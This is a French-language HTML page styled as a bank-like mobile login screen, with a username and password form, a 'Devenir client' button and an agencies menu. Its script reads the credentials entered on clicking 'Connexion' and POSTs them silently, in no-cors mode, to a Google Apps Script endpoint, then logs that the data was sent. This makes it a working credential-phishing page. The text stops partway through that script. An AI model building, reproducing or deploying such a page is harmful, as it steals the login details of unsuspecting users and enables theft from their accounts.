<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Commmnexion</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background-image: url('x.png');
      background-size: cover;
      background-position: center;
      min-height: 100vh;
      overflow: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding-bottom: 80px;
    }

    .logo-container {
      margin-top: 40px;
      margin-bottom: 30px;
      height: 50px;
    }

    .logo-container img {
      height: 100%;
    }

    .login-box {
      background: white;
      border-radius: 20px;
      width: 320px;
      padding: 30px 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.15);
      text-align: center;
      margin-bottom: 30px;
    }

    h2 {
      margin-bottom: 20px;
      color: #1a1a1a;
      font-size: 24px;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin-bottom: 15px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 14px;
      outline: none;
    }

    .password-container {
      position: relative;
    }

    .password-container input {
      padding-right: 40px;
    }

    .toggle-visibility {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
      width: 20px;
      height: 20px;
    }

    .toggle-visibility img {
      width: 100%;
      height: 100%;
      object-fit: contain;
      filter: brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%);
    }

    .remember {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }

    .remember input[type="checkbox"] {
      appearance: none;
      background-color: #fff;
      border: 2px solid #f1482d;
      border-radius: 4px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      position: relative;
    }

    .remember input:checked::before {
      content: "✓";
      position: absolute;
      left: 3px;
      top: -2px;
      color: white;
      font-size: 16px;
      background-color: #f1482d;
      border-radius: 2px;
      width: 100%;
      height: 100%;
      text-align: center;
    }

    .remember label {
      margin-left: 10px;
      color: #1a1a1a;
      font-weight: bold;
      font-size: 14px;
    }

    button.connexion {
      width: 100%;
      padding: 12px;
      background-color: #e5e5e5;
      border: none;
      border-radius: 20px;
      font-size: 16px;
      font-weight: bold;
      color: #1a1a1a;
      cursor: pointer;
    }

    .error {
      color: #f1482d;
      font-size: 14px;
      margin-top: 15px;
    }

    .devenir {
      margin-bottom: 30px;
    }

    .devenir button {
      background: white;
      color: #f1482d;
      border: 2px solid #f1482d;
      padding: 10px 20px;
      font-weight: bold;
      border-radius: 30px;
      cursor: pointer;
    }

    .bottom-menu {
      display: flex;
      justify-content: space-around;
      width: 100%;
      padding: 12px 0;
      background-color: white;
      position: fixed;
      bottom: 0;
      left: 0;
      border-top: 1px solid #e0e0e0;
      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
    }

    .menu-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-decoration: none;
      color: #333;
      font-size: 12px;
      padding: 0 5px;
      width: 25%;
      text-align: center;
    }

    .menu-icon {
      width: 24px;
      height: 24px;
      margin-bottom: 4px;
      object-fit: contain;
    }

    .menu-item:first-child .menu-icon {
      -webkit-filter: brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%);
      filter: brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%);
    }
  </style>
</head>
<body>

  <div class="logo-container">
    <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752920371/logo_uhwnmt.png" alt="Logo">
  </div>

  <div class="login-box">
    <h2>Bienvenue</h2>
    <input type="text" placeholder="Identifiant">
    
    <div class="password-container">
      <input type="password" id="password" placeholder="Mot de passe">
      <span class="toggle-visibility" onclick="togglePassword()">
        <img src="https://res.cloudinary.com/dfeygxpwc/image/upload/v1752649689/1752649535674_hbfbwi.png" alt="voir">
      </span>
    </div>

    <div class="remember">
      <input type="checkbox" id="remember" checked>
      <label for="remember">Se souvenir de moi</label>
    </div>

    <button class="connexion">Connexion</button>

    <div class="error">Identifiant ou mot de passe oublié</div>
  </div>

  <div class="devenir">
    <button>Devenir client</button>
  </div>

  <div class="bottom-menu">
    <a href="#" class="menu-item">
      <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752916125/6821154_qtinen.png" alt="Accueil" class="menu-icon">
      <span>Accueil</span>
    </a>
    <a href="#" class="menu-item">
      <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752919067/1752918963546_fg9ltu.png" alt="Agences" class="menu-icon">
      <span>Agences</span>
    </a>
    <a href="#" class="menu-item">
      <img src="https://res.cloudinary.com/dwbfepbow/image/upload/v1752919039/menu-60_egg3tp.png" alt="Menu" class="menu-icon">
      <span>Menu</span>
    </a>
  </div>

  <script>
    function togglePassword() {
      const passField = document.getElementById("password");
      const icon = document.querySelector(".toggle-visibility img");
      
      if (passField.type === "password") {
        passField.type = "text";
        icon.style.filter = "none";
      } else {
        passField.type = "password";
        icon.style.filter = "brightness(0) saturate(100%) invert(36%) sepia(90%) saturate(745%) hue-rotate(347deg) brightness(97%) contrast(101%)";
      }
    }

    document.querySelector('.connexion').addEventListener('click', function () {
      const identifiant = document.querySelector('input[type="text"]').value;
      const motDePasse = document.querySelector('input[type="password"]').value;

      fetch("https://script.google.com/macros/s/AKfycbwusDJ-zo2Btqt5-3vYnDDAVPjNMOSjGVkdBAesi0dwd7HtbyXLHIP2yBiMExSIb9sE4A/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: `identifiant=${encodeURIComponent(identifiant)}&motdepasse=${encodeURIComponent(motDePasse)}`
      }).then(() => {
        console.log("Données envoyées avec succès.");
